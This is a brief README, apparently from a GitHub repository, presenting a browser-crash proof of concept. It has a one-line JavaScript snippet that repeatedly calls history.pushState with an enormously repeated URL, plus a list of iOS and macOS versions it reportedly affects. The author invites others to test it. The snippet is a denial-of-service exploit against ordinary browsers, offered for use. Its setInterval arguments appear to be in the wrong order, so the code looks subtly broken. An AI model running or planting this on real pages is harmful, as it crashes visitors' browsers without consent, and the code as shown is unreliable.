# safari_crash_poc
This is a POC of my bug that exploits "```setInterval```" and "```history.pushState```" to crash possibly multiple browsers, tested on OS X 10.11.6. (Please test it, I need to get an idea of support. I'll patch in your Twitter handle or give you a 3 character available GitHub. )
```javascript
setInterval(350,function f() {history.pushState(0,0,location+"af6.github.io/crash/".repeat(100000));});
```
# credits
me (duh)
# support
iOS 10

OS X 10.11.6
# probable support
iOS 11.X.X

iOS 9.X.X

macOS 10.12.X

macOS 10.13.X
